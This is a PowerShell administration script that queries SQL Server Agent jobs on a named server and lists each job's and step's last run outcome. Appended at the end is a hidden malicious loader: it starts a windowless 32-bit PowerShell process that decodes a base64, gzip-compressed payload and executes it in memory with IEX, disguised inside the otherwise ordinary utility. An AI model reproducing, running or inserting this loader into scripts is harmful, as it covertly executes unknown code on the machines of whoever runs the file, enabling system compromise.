﻿	[void][reflection.assembly]::LoadWithPartialName("Microsoft.SqlServer.ConnectionInfo")
	[void][reflection.assembly]::LoadWithPartialName("Microsoft.SqlServer.SmoEnum")
	[void][reflection.assembly]::LoadWithPartialName("Microsoft.SqlServer.Smo")

	$namedInstance = new-object('Microsoft.SqlServer.Management.Smo.server') 'XSQLUTIL18'
	
	$jobs = $namedInstance.jobserver.jobs 

	
	foreach ($job in $jobs) 
	{
		[int]$outcome = 0
		[string]$output = ""
	
		
		if ($job.LastRunOutcome -ne "Succeeded") 
		{
			$outcome++;
			$output = $output + " Job failed (" + $job.name + ")" + " Result: " + $job.LastRunOutcome;
		}
		elseif ($job.LastRunOutcome -eq "Succeeded")
		{
			$outcome++;
			$output = $output + " Job succeeded " + $job.Name + ")" + " Result: " + $job.LastRunOutcome;
		}
		
		
		foreach ($jobStep in $job.jobsteps) 
		{
			if ($jobStep.LastRunOutcome -ne "Succeeded")
			{
				$outcome++;
				$output = $output + " Step failed (" + $jobStep.name + ")" + " Result: " + $jobStep.LastRunOutcome + " -- ";
			}
			elseif ($jobstep.LastRunOutcome -eq "Succeeded")
			{
				$outcome++;
				$output = $output + " Step succeeded (" + $jobStep.Name + ")" + "Result: " + $jobStep.LastRunOutcome + " -- ";
			}
		}
		
		if ($outcome -gt 0)    
		{
			$obj = New-Object Object;
			$obj | Add-Member Noteproperty name -value $job.name;
			$obj | Add-Member Noteproperty lastrundate -value $job.lastrundate;
			$obj | Add-Member Noteproperty lastrunoutcome -value $output;
			$obj | Add-Member Noteproperty lastrunduration -value $jobStep.LastRunDuration;
			$obj
		}
	}
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAEloBVgCA71WbW/aOhT+3En7D9GERKJRApSta6VJ1wnvJRSaEgoMTW7iBBcTZ47TFnb33+8JJCu766befbgRKH55jn38nOf4xE9CV1IeKrEX+6uLQN4GytfXr46GWOC1ohbILUaR2a759aCkFJL2dNXTjo4AUIi6yVVrqHxU1DmKogZfYxouzs/NRAgSyn2/3CYSxTFZ3zJKYlVT/lYmSyLI8eXtHXGl8lUpfC63Gb/FLINtTOwuiXKMQi+d63MXp+6V7YhRqRY/fSpq8+Pqotz8kmAWq0V7E0uyLnuMFTXlm5ZueL2JiFq0qCt4zH1ZntDwpFYehzH2yQBWuycWkUvuxUUNzgE/QWQiQiU7UbrEHqAWoTkU3EWeJ0gM+HI3vOcrohbChLGS8pc6z/a/SkJJ1wTmJRE8som4py6Jyx0ceoxcEX+hDshDfuyXGqmHRoAaSqGVICjPOmpxL2Fkb1vUfnb1MJQaPN/DCSx8e/3q9Ss/l4IbBRcDezubHSoBWkfzXZuAt+qQx3QH/qhUSooFu2LJxQa6hWuREG2hzNM4zBcLpbBcWvgyKv16hWoOB/B60jOsz5N3toCJucOptwDDLFKFyD11xJnpjnqp8n4jvAbxaUgamxCvqZtrS30uCMRnZHfucg4bgIdqMZsgXoMwEmCZklpS5j+bNddUfrc1Eso8IpALgYzBK4ix9qMz+zipxW5okTVQtu8XIRw+KJrk6EzFm3z3tA+goslwHJeUYQIp5ZYUm2BGvJKCwphmUyiRfNcsPrlrJUxSF8cyX26h/YvObFuTh7EUiQvBBAqu7Yi4FLOUkZLSoR4xNjYN8u2Lz/JhYsZoGMBK9xAPGEl5sGUqEQGeZnLQyjaR3XXEyBpQuyRvMRxASmdpsVMVDohX/IWrufb3Qk+5yUk5cBQCbjMuS4pDhYQrI+X5SWJ/6s3hpXHglylIFik1T6q5sZFpFhRkZ3AWr4xUtRllO4KEBHJagq8NHJP3dVsKoE59o19SE8Ez7YbMco0VraIHWu1a8B/Tky5vnHoXvbuOLhqPSx91467VGTZGnU79vmc7dWk3u/Ji2JVW8+buzkadq/FUzrqoc00rq2l9G/Xo1u4jb/qov98a24eK8bi9Czx/2vD94NS3r6rvWrQ/MUdGpYb7jWbSnxgPRqUeN+lDZ0THo1WvJW+nDsNjXw9uqmeYPvbFnVPl1raLUHt54m57vtNeWt5m2tHPJvUVaiJkhk2nZfCLqSHQUHdw4PCHi8DA68BEhmtRMhuNW8Zo1DLQuH33pXGmB2B7g5fGxKnRWXRztYR+C1y40Cv1rke2fDoCktoc4eAKMIFZc5c+YBpvkfF2wOMaXhkcGYBpzb6AX9OoNWQwfz2uceSwwQ1G/dmmpevV6bCOOhU6aQcoXRIHxgij+L6xbehVx+Pe5N1g6uvODTvVG+Z15Pq6rj90GhfurPr44fL0Q39CnTVHY1133qQKAYkU7rEpDuL9q+vewiJeYgY6gFs8z88WF63sPh5ymlqo6kGJXhEREgZlDQpfLm3EGHfT+vB0f0OB2peNBWTqGJontWdbmvIdqD2Vjnzo/HwGDkOuZBou90kYyGWp8nhSqcDtX3msV+DMLz+nyaONmq9WSgvIjquDHdhuBy3NoMKmdml92E7Y/0FllsFLeHkvovJp7DezL6K3UtqT8NPwjwP/ieg/ZGGCqQS8DVcRI/ty+RsyMgkdfHLkEQOF+NmTfvpdJvJ4AF8j/wA1xafydAoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

